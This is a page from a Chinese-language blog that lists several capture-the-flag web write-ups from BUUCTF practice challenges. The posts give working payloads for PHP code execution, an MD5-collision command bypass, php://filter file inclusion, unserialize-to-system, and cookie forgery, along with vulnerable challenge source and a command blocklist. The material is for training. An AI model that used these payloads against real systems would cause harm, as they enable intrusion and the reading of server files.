<p><img src="/2024/05/09/buu%E5%88%B7%E9%A2%98%E9%9B%86/BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240509213750785.png" alt="image-20240509213750785"></p>
<p>拿到flag</p>
<p>还有一种方法</p>
<p>就是通过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\S*=$&#123;getFlag()&#125;</span><br></pre></td></tr></table></figure>

<p>调用getFlag函数</p>
<p>之后可以传cmd上去执行</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>





<h4 id="rce漏洞"><a href="#rce漏洞" class="headerlink" title="rce漏洞"></a>rce漏洞</h4><p>上面的命令执行，相当于 <strong>eval(‘strtolower(“\1”);’)</strong> 结果，当中的 <strong>\1</strong> 实际上就是 <strong>\1</strong> ，而 <strong>\1</strong> 在正则表达式中有自己的含义。我们来看看 <a target="_blank" rel="noopener" href="https://www.w3cschool.cn/zhengzebiaodashi/regexp-syntax.html"><strong>W3Cschool</strong></a> 中对其的描述：</p>
<blockquote>
<p><strong>反向引用</strong></p>
<p>对一个正则表达式模式或部分模式 <strong>两边添加圆括号</strong> 将导致相关 <strong>匹配存储到一个临时缓冲区</strong> 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p>
</blockquote>
<p>所以这里的 <strong>\1</strong> 实际上指定的是第一个子匹配项，我们拿 <strong>ripstech</strong> 官方给的 <strong>payload</strong> 进行分析，方便大家理解。官方 <strong>payload</strong> 为： <strong>&#x2F;?.*&#x3D;{${phpinfo()}}</strong> ，即 <strong>GET</strong> 方式传入的参数名为 <strong>&#x2F;?.*</strong> ，值为 <strong>{${phpinfo()}}</strong> 。</p>
<p>有时候.会被过滤</p>
<p>可以考虑换为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\S*=$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure>


            
        </div>
    </div>
    <div class="post-tags">
        
        
        
    </div>
    <a href="/2024/05/09/buu%E5%88%B7%E9%A2%98%E9%9B%86/BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2024/05/08/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/">
        <h2 class="post-title">[安洵杯 2019]easy_web</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/5/8
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <p><img src="/2024/05/08/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240508210358717.png" alt="image-20240508210358717"></p>
<p>emm，我看到页面上有个get传的参数</p>
<p><img src="/2024/05/08/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240508210751258.png" alt="image-20240508210751258"></p>
<p>在看看源代码</p>
<p><img src="/2024/05/08/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240508210827187.png" alt="image-20240508210827187"></p>
<p>所以我把他传的数据去解码一下</p>
<p><img src="/2024/05/08/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240508211030178.png" alt="image-20240508211030178"></p>
<p>是真的好用</p>
<p>所以，这是传了一个文件上去啊，那我在源代码看</p>
<p><img src="/2024/05/08/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240508211225367.png" alt="image-20240508211225367"></p>
<p>应该就是源码了吧，那我试试查看index.php行不行嘞</p>
<p>说干就干</p>
<p>翻译555.png是先base64再base64在hex，那我这次反过来试试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</span><br></pre></td></tr></table></figure>

<p>所以，找到了源码</p>
<p>解码一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(&#x27;content-type:text/html;charset=utf-8&#x27;);</span><br><span class="line">$cmd = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">if (!isset($_GET[&#x27;img&#x27;]) || !isset($_GET[&#x27;cmd&#x27;])) </span><br><span class="line">    header(&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[&#x27;img&#x27;])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);</span><br><span class="line">if (preg_match(&quot;/flag/i&quot;, $file)) &#123;</span><br><span class="line">    echo &#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;;</span><br><span class="line">    die(&quot;xixiï½ no flag&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    echo &quot;&lt;img src=&#x27;data:image/gif;base64,&quot; . $txt . &quot;&#x27;&gt;&lt;/img&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123;</span><br><span class="line">        echo `$cmd`;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:#CCCCCC;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>所以就是get传一个cmd</p>
<p>post传a和b</p>
<p>a和b是md5强碰撞</p>
<p>cmd没什么限制（doge）</p>
<p><img src="/2024/05/08/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240508213547847.png" alt="image-20240508213547847"></p>
<p>所以尝试一下</p>
<p>现在还有一个函数sort没有被禁，也是可以读取文件的</p>
<p>所以我们要找一找flag在哪个文件里面</p>
<p>试试能不能l&#x2F;s绕过吧</p>
<p>强碰撞如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure>

<p><img src="/2024/05/08/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240508221254586.png" alt="image-20240508221254586"></p>
<p>c\at &#x2F;flag拿到flag</p>

            
        </div>
    </div>
    <div class="post-tags">
        
        
        
    </div>
    <a href="/2024/05/08/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2024/05/07/buu%E5%88%B7%E9%A2%98%E9%9B%86/BSidesCF-2020-Had-a-bad-day/">
        <h2 class="post-title">[BSidesCF 2020]Had a bad day</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/5/7
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <p><img src="/2024/05/07/buu%E5%88%B7%E9%A2%98%E9%9B%86/BSidesCF-2020-Had-a-bad-day/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240507220210629.png" alt="image-20240507220210629"></p>
<p>cheer不了一点，毕竟是学网安的</p>
<p>这里可以看到只有两个选项，所以我们想查看一下其他的东西</p>
<p>可以使用伪协议进行读取</p>
<p>（我觉得只要直接传入参数看不到东西的时候就用伪协议）</p>
<p>base64解码之后读取到源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">	$file = $_GET[&#x27;category&#x27;];</span><br><span class="line">	if(isset($file))</span><br><span class="line">	&#123;</span><br><span class="line">		if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;</span><br><span class="line">			include ($file . &#x27;.php&#x27;);</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">			echo &quot;Sorry, we currently only support woofers and meowers.&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br><span class="line">			</span><br></pre></td></tr></table></figure>

<p>这里保留了php代码部分，因为基本上不会是前端出问题</p>
<p>在这里能看出来，这是要传woofers或者meowers上去</p>
<p>换句话说就是你传上去的东西里面必须包含了其中一个字符串</p>
<p>所以我们可以采取文件包含</p>
<p>比如woofers&#x2F;..&#x2F;flag</p>
<p><img src="/2024/05/07/buu%E5%88%B7%E9%A2%98%E9%9B%86/BSidesCF-2020-Had-a-bad-day/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240507221250137.png" alt="image-20240507221250137"></p>
<p>发现了这个！</p>
<p>所以我么尝试使用伪协议读取（一般读不出来都用伪协议试试）</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?category=php://filter/read=convert.base64-encode/resource=meowers/../flag</span><br></pre></td></tr></table></figure>

<p>回显出一段字符串，base64解码</p>
<p>得到flag</p>

            
        </div>
    </div>
    <div class="post-tags">
        
        
        
    </div>
    <a href="/2024/05/07/buu%E5%88%B7%E9%A2%98%E9%9B%86/BSidesCF-2020-Had-a-bad-day/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2024/05/07/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/">
        <h2 class="post-title">[网鼎杯 2020 朱雀组]phpweb</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/5/7
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <p><img src="/2024/05/07/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240507213032149.png" alt="image-20240507213032149"></p>
<p>我只能说很抽象</p>
<p>因为看它一直闪啊闪，我猜测可能有问题，抓个包试试</p>
<p><img src="/2024/05/07/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240507213344380.png" alt="image-20240507213344380"></p>
<p>发现两个参数我们试试</p>
<p>date函数是咋用的来着？</p>
<p>date(Y-m-d h:i:s a)</p>
<p>好像是这个，所以大概率就是a(b)的形式</p>
<p>所以尝试打开index.php</p>
<p><img src="/2024/05/07/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240507213638501.png" alt="image-20240507213638501"></p>
<p>发现源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);</span><br><span class="line">    function gettime($func, $p) &#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        if ($a == &quot;string&quot;) &#123;</span><br><span class="line">            return $result;</span><br><span class="line">        &#125; else &#123;return &quot;&quot;;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Test &#123;</span><br><span class="line">        var $p = &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">        var $func = &quot;date&quot;;</span><br><span class="line">        function __destruct() &#123;</span><br><span class="line">            if ($this-&gt;func != &quot;&quot;) &#123;</span><br><span class="line">                echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func = $_REQUEST[&quot;func&quot;];</span><br><span class="line">    $p = $_REQUEST[&quot;p&quot;];</span><br><span class="line"></span><br><span class="line">    if ($func != null) &#123;</span><br><span class="line">        $func = strtolower($func);</span><br><span class="line">        if (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            echo gettime($func, $p);</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            die(&quot;Hacker...&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>

<p>禁用了许多函数，这里看到了class，想到了序列化，如果func传一个unserialize后面再传序列化的命令应该可以绕过</p>
<p>尝试一下，先看看能不能成功，尝试一下ls</p>
<p><img src="/2024/05/07/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240507215018774.png" alt="image-20240507215018774"></p>
<p>诶嘿，全都看见喽</p>
<p>所以是可行的，所以之后可以用上我跟大佬学的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find+/+-name+flag*</span><br></pre></td></tr></table></figure>

<p>查找所有带flag的</p>
<p>嘻嘻</p>
<p><img src="/2024/05/07/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240507215224689.png" alt="image-20240507215224689"></p>
<p>之后就一个个找过去吧，先从下面找，我觉得不会放那么里面吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>嘻嘻</p>
<p><img src="/2024/05/07/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240507215354779.png" alt="image-20240507215354779"></p>
<p>OK了</p>

            
        </div>
    </div>
    <div class="post-tags">
        
        
        
    </div>
    <a href="/2024/05/07/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2024/05/07/buu%E5%88%B7%E9%A2%98%E9%9B%86/BSidesCF-2019-Kookie/">
        <h2 class="post-title">[BSidesCF 2019]Kookie</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/5/7
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <p><img src="/2024/05/07/buu%E5%88%B7%E9%A2%98%E9%9B%86/BSidesCF-2019-Kookie/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240507211444080.png" alt="image-20240507211444080"></p>
<p>要让我们使用admin登录进去，但是只给我们cookie的username和密码</p>
<p>所以我们先尝试一下登录，没什么大用处</p>
<p>所以直接下一位</p>
<p>抓包试试，然后直接重发看看会发生什么效果</p>
<p><img src="/2024/05/07/buu%E5%88%B7%E9%A2%98%E9%9B%86/BSidesCF-2019-Kookie/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240507212219483.png" alt="image-20240507212219483"></p>
<p>所以说，我们的username是靠cookie决定的，所以我们可以试试在原本的抓包中创建一个新的cookie</p>
<p><img src="/2024/05/07/buu%E5%88%B7%E9%A2%98%E9%9B%86/BSidesCF-2019-Kookie/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240507212413327.png" alt="image-20240507212413327"></p>
<p>一定要在referer之前传才有用哦</p>
<p>放包就直接登上去了</p>

            
        </div>
    </div>
    <div class="post-tags">
        
        
        
    </div>
    <a href="/2024/05/07/buu%E5%88%B7%E9%A2%98%E9%9B%86/BSidesCF-2019-Kookie/" class="go-post">阅读全文</a>
</div>


        <div class="page-current">
    
    <a class="page-num" href="/page/2/">
        <i class="fa-solid fa-caret-left fa-fw"></i>
    </a>
    <a class="page-num" href="/">1</a>
    <span class="page-omit">...</span>
    
    <span class="current">3</span>
    
    <a class="page-num" href="/page/4">4</a>
    
    
    <a class="page-num" href="/page/5">5</a>
    
    
    
    <a class="page-num" href="/page/4/">
        <i class="fa-solid fa-caret-right fa-fw"></i>
    </a>
    
</div>

    </div>
    
    <div id="home-card">
        <div id="card-style">
    <div id="card-div">
        <div class="avatar">
            <img src="/images/avatar.jpg" alt="avatar" />
        </div>
        <div class="name">why</div>
        <div class="description">
            <p>Description<br>…</p>

        </div>
        
        
        <div class="friend-links">
            
            <div class="friend-link">
                <a target="_blank" rel="noopener" href="https://argvchs.github.io">Argvchs</a>
            </div>
            
        </div>
        
    </div>
</div>

    </div>
    
</div>

            <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2024 why
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;why
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

        </div>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/js/main.js"></script>
    
<script src="/js/<file>"></script>
<link rel="stylesheet" href="/css/<file>" />
</body>
</html>
